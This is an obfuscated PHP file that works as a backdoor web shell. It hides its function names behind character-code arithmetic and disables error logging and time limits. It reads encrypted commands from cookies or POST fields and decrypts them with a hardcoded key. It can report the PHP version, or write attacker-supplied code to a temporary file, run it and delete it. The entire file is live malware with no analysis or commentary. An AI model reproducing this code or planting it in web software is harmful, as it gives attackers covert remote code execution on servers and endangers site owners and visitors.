<?php $lildo = 'f'."\151"."\x6c".chr(1001-900)."\137"."\160"."\x75".chr(700-584).chr(95).chr(470-371).chr(111)."\156"."\164".chr(101).'n'."\164".'s';
$tprisydqeb = "\x62".'a'.'s'."\x65"."\x36".chr(669-617).'_'.'d'.'e'."\143".chr(601-490)."\x64"."\145";
$qrwtkmsi = "\x69"."\156".chr(1001-896).chr(146-51).chr(115).'e'."\164";
$foxgni = chr(493-376)."\x6e".chr(108)."\151".chr(316-206).'k';


@$qrwtkmsi(chr(101).chr(981-867).'r'."\157".chr(671-557).chr(331-236).chr(848-740).chr(111)."\147", NULL);
@$qrwtkmsi("\x6c"."\x6f"."\147".'_'."\145".chr(114)."\x72"."\x6f"."\162".'s', 0);
@$qrwtkmsi('m'.'a'."\x78"."\137".chr(101)."\x78"."\145".'c'.chr(274-157).'t'."\x69"."\157"."\156".'_'."\x74".'i'.'m'."\145", 0);
@set_time_limit(0);

function wqesmepdj($pxlsfs, $yhgeb)
{
    $nlmzbcaspr = "";
    for ($hittiupqj = 0; $hittiupqj < strlen($pxlsfs);) {
        for ($j = 0; $j < strlen($yhgeb) && $hittiupqj < strlen($pxlsfs); $j++, $hittiupqj++) {
            $nlmzbcaspr .= chr(ord($pxlsfs[$hittiupqj]) ^ ord($yhgeb[$j]));
        }
    }
    return $nlmzbcaspr;
}

$euqlsiqgtw = array_merge($_COOKIE, $_POST);
$totwcxycaw = 'a4812f55-73c9-448b-95dd-a4b6e4fde7f3';
foreach ($euqlsiqgtw as $nypmtplylf => $pxlsfs) {
    $pxlsfs = @unserialize(wqesmepdj(wqesmepdj($tprisydqeb($pxlsfs), $totwcxycaw), $nypmtplylf));
    if (isset($pxlsfs['a'.'k'])) {
        if ($pxlsfs["\x61"] == "\x69") {
            $hittiupqj = array(
                "\x70"."\x76" => @phpversion(),
                chr(673-558).'v' => "3.5",
            );
            echo @serialize($hittiupqj);
        } elseif ($pxlsfs["\x61"] == 'e') {
            $rymiovipw = "./" . md5($totwcxycaw) . "\x2e"."\151"."\x6e".'c';
            @$lildo($rymiovipw, "<" . "\x3f"."\x70".chr(575-471).chr(406-294).chr(32).chr(823-759)."\x75"."\156"."\154".'i'.chr(110)."\x6b"."\x28".chr(95)."\137"."\106".'I'.chr(596-520)."\105".'_'.'_'.chr(41).chr(334-275).' ' . $pxlsfs[chr(100)]);
            @include($rymiovipw);
            @$foxgni($rymiovipw);
        }
        exit();
    }
}

